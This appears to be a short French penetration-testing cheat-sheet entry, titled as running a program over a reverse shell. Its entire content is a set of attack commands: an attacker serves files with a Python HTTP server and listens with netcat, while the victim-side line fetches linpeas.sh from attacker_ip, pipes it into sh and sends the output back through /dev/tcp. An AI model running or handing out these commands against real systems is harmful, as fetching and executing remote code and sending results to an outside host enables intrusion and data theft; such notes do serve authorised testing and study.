Exécuter un programme sur un reverse shell
```bash
attacker1$ python3 -m http.server  <- se lance sur le port 8000
attacker2$ nc -nlvp 9000 | tee linpeas-out.txt 

victim$ curl http://attacker_ip:8000/linpeas.sh | sh > /dev/tcp/attacker_ip/9000
```

